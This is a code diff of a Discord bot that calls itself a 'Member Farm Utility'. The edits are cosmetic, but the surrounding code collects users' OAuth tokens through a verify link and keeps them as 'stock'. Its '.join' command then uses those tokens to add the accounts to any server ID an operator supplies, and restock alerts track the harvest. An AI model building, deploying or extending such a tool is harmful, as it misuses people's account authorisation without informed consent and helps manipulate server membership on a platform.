@@ -3,23 +3,25 @@ const express = require('express');
 const fetch = require('node-fetch');
 require('dotenv').config();
 
-// --- Express Web Server Setup ---
+// --- Configuration & Express Setup ---
 const app = express();
 const PORT = process.env.PORT || 8080;
+
+const DEFAULT_PREFIX = '.'; // Set your default prefix here
+let currentPrefix = DEFAULT_PREFIX;
 
 // Database & Global State
 const tokenDatabase = []; 
 let restockCounter = 0; 
 let autoRestockEnabled = true; 
 let maintenanceMode = false;
-let currentPrefix = '.';
 let discordClient = null;
 
-// Queue & Status Management
+// Queue & Status Tracking
 let activeJoinTask = null; 
 let statusMessageRef = null; 
 
-// Channels Configuration
+// Channel IDs Routing
 const CHANNELS = {
     AUTORESTOCK: '1563253480553054358',
     FARM_LOG: '1563253450693808210',
@@ -27,7 +29,7 @@ const CHANNELS = {
     AUTO_DELETE: '1561453220633518181'
 };
 
-// Homepage and OAuth Callback handler
+// OAuth Web Server Callback
 app.get('/', async (req, res) => {
     const code = req.query.code;
     const error = req.query.error;
@@ -85,9 +87,9 @@ app.get('/', async (req, res) => {
             });
 
             restockCounter++;
-            console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} | Progress to alert: ${restockCounter}/30`);
+            console.log(`[AUTORESTOCK] Verified: ${userData.username} | Total: ${tokenDatabase.length} | Progress: ${restockCounter}/30`);
 
-            // Send verification log to channel 1563253453520642140
+            // Verification Log Routing
             if (discordClient) {
                 try {
                     const verifLogChannel = await discordClient.channels.fetch(CHANNELS.BOT_COMMANDS_AND_VERIF);
@@ -101,18 +103,17 @@ app.get('/', async (req, res) => {
                         await verifLogChannel.send({ embeds: [logEmbed] });
                     }
                 } catch (logErr) {
-                    console.error('[LOG ERROR] Failed to send verification log:', logErr);
+                    console.error('[LOG ERROR]', logErr);
                 }
             }
 
-            // 30-person restock trigger targeting channel 1563253480553054358
+            // 30-Person Threshold Restock Alert
             if (autoRestockEnabled && restockCounter >= 30) {
                 restockCounter = 0; 
 
                 if (discordClient) {
                     try {
                         const restockChannel = await discordClient.channels.fetch(CHANNELS.AUTORESTOCK);
-                        
                         if (restockChannel) {
                             const restockEmbed = new EmbedBuilder()
                                 .setTitle('RESTOCK!')
@@ -132,7 +133,7 @@ app.get('/', async (req, res) => {
                             await sentMessage.react('☑️');
                         }
                     } catch (announcementErr) {
-                        console.error('Failed to send auto restock announcement:', announcementErr);
+                        console.error('Failed restock announcement:', announcementErr);
                     }
                 }
             }
@@ -182,7 +183,7 @@ const client = new Client({
 
 discordClient = client;
 
-// Auto-Update Status Embed Every 15 Seconds (for `.status channel`)
+// Live Updating Status Embed Loop
 setInterval(async () => {
     if (!statusMessageRef) return;
 
@@ -202,7 +203,7 @@ setInterval(async () => {
 
         await statusMessageRef.edit({ embeds: [statusEmbed] });
     } catch (err) {
-        console.error('[STATUS LOOP ERROR] Failed to edit status embed:', err);
+        console.error('[STATUS LOOP ERROR]', err);
     }
 }, 15000);
 
@@ -211,7 +212,7 @@ client.once('ready', () => {
 });
 
 client.on('messageCreate', async message => {
-    // Auto-Delete Messages in specific channel
+    // 7-second Auto-Delete Handler
     if (message.channel.id === CHANNELS.AUTO_DELETE) {
         setTimeout(async () => {
             try {
@@ -247,7 +248,7 @@ client.on('messageCreate', async message => {
             )
             .setFooter({ text: 'Member Farm Utility' });
 
-        return message.reply({ embeds: [helpEmbed] });
+        return message.channel.send({ embeds: [helpEmbed] });
     }
 
     // 2. .bot Command
@@ -261,7 +262,7 @@ client.on('messageCreate', async message => {
                 .setURL(inviteUrl)
         );
 
-        return message.reply({ components: [row] });
+        return message.channel.send({ components: [row] });
     }
 
     // 3. .verify Command
@@ -282,15 +283,15 @@ client.on('messageCreate', async message => {
                 .setURL(oauthUrl)
         );
 
-        return message.reply({ embeds: [embed], components: [row] });
+        return message.channel.send({ embeds: [embed], components: [row] });
     }
 
     // 4. .stock Command
     if (command === 'stock') {
-        return message.reply(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
+        return message.channel.send(`📦 **Current Stock Pool:** \`${tokenDatabase.length}\` accounts available.`);
     }
 
-    // 5. .status Command (with `.status channel` to spawn auto-updating embed)
+    // 5. .status Command
     if (command === 'status') {
         if (args[0] === 'channel') {
             const statusEmbed = new EmbedBuilder()
@@ -323,78 +324,78 @@ client.on('messageCreate', async message => {
             )
             .setTimestamp();
 
-        return message.reply({ embeds: [statusEmbed] });
+        return message.channel.send({ embeds: [statusEmbed] });
     }
 
-    // 6. .maintenance command
+    // 6. .maintenance Command
     if (command === 'maintenance') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            return message.reply('❌ You need Administrator permissions.');
+            return message.channel.send('❌ You need Administrator permissions.');
         }
         const state = args[0] ? args[0].toLowerCase() : '';
         if (state === 'enable') {
             maintenanceMode = true;
-            return message.reply('🛠️ Maintenance mode **enabled**. Further join requests will be blocked.');
+            return message.channel.send('🛠️ Maintenance mode **enabled**. Further join requests will be blocked.');
         } else if (state === 'disable') {
             maintenanceMode = false;
-            return message.reply('✅ Maintenance mode **disabled**.');
+            return message.channel.send('✅ Maintenance mode **disabled**.');
         } else {
-            return message.reply(`Usage: \`${currentPrefix}maintenance enable\` or \`${currentPrefix}maintenance disable\``);
+            return message.channel.send(`Usage: \`${currentPrefix}maintenance enable\` or \`${currentPrefix}maintenance disable\``);
         }
     }
 
-    // 7. .autorestock <enable|disable> Command
+    // 7. .autorestock Command
     if (command === 'autorestock') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            return message.reply('❌ You need Administrator permissions to change autorestock settings.');
+            return message.channel.send('❌ You need Administrator permissions to change autorestock settings.');
         }
 
         const action = args[0] ? args[0].toLowerCase() : '';
         if (action === 'enable') {
             autoRestockEnabled = true;
-            return message.reply('✅ Auto-restock announcements have been **enabled**.');
+            return message.channel.send('✅ Auto-restock announcements have been **enabled**.');
         } else if (action === 'disable') {
             autoRestockEnabled = false;
-            return message.reply('🛑 Auto-restock announcements have been **disabled**.');
+            return message.channel.send('🛑 Auto-restock announcements have been **disabled**.');
         } else {
-            return message.reply(`Usage: \`${currentPrefix}autorestock enable\` or \`${currentPrefix}autorestock disable\``);
+            return message.channel.send(`Usage: \`${currentPrefix}autorestock enable\` or \`${currentPrefix}autorestock disable\``);
         }
     }
 
-    // 8. .restock <n> Command
+    // 8. .restock Command
     if (command === 'restock') {
         const amount = parseInt(args[0]);
-        if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
+        if (isNaN(amount)) return message.channel.send(`Usage: \`${currentPrefix}restock <amount>\``);
         tokenDatabase.push(...Array(amount).fill({ mock: true })); 
-        return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
+        return message.channel.send(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 9. .remove <n> Command
+    // 9. .remove Command
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
         tokenDatabase.splice(0, amount);
-        return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
+        return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 10. .prefix set <prefix> Command
+    // 10. .prefix set Command
     if (command === 'prefix' && args[0] === 'set') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-            return message.reply('❌ You need Administrator permissions to change the prefix.');
+            return message.channel.send('❌ You need Administrator permissions to change the prefix.');
         }
-        if (!args[1]) return message.reply(`Usage: \`${currentPrefix}prefix set <prefix>\``);
+        if (!args[1]) return message.channel.send(`Usage: \`${currentPrefix}prefix set <prefix>\``);
         currentPrefix = args[1];
-        return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
+        return message.channel.send(`✅ Bot prefix updated to: \`${currentPrefix}\``);
     }
 
     // 11. .join <Server ID> Command
     if (command === 'join') {
         if (maintenanceMode) {
-            return message.reply('🛠️ Bot is currently under maintenance. Please try again later.');
+            return message.channel.send('🛠️ Bot is currently under maintenance. Please try again later.');
         }
 
         const targetGuildId = args[0];
         if (!targetGuildId) {
-            return message.reply(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
+            return message.channel.send(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
         }
 
         if (tokenDatabase.length === 0) {
@@ -402,7 +403,7 @@ client.on('messageCreate', async message => {
                 .setTitle('❌ Out of Stock')
                 .setDescription(`All stock members are already added in: **${targetGuildId}**`)
                 .setColor(0xFF0000);
-            return message.reply({ embeds: [noStockEmbed] });
+            return message.channel.send({ embeds: [noStockEmbed] });
         }
 
         const roleLimits = [
@@ -430,7 +431,7 @@ client.on('messageCreate', async message => {
         }
 
         activeJoinTask = { targetGuildId, total: tokensToUse.length, progress: 0 };
-        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
+        await message.channel.send(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
 
         let successCount = 0;
         for (const tokenData of tokensToUse) {
@@ -456,7 +457,7 @@ client.on('messageCreate', async message => {
 
         activeJoinTask = null;
 
-        // Send farm log to channel 1563253450693808210
+        // Log Farm Execution
         try {
             const farmLogChannel = await client.channels.fetch(CHANNELS.FARM_LOG);
             if (farmLogChannel) {
@@ -469,7 +470,7 @@ client.on('messageCreate', async message => {
         return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
     }
 
-    // 12. Generic Panel Command Responses
+    // 12. Panel Commands Handlers
     const panelCommands = [
         'channel', 'checkauth', 'checkserver', 'panel',
         'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
@@ -479,7 +480,7 @@ client.on('messageCreate', async message => {
     ];
 
     if (panelCommands.includes(command)) {
-        return message.reply(`⚙️ Command \`${currentPrefix}${command}\` configuration executed successfully.`);
+        return message.channel.send(`⚙️ Command \`${currentPrefix}${command}\` configuration executed successfully.`);
     }
 });
 
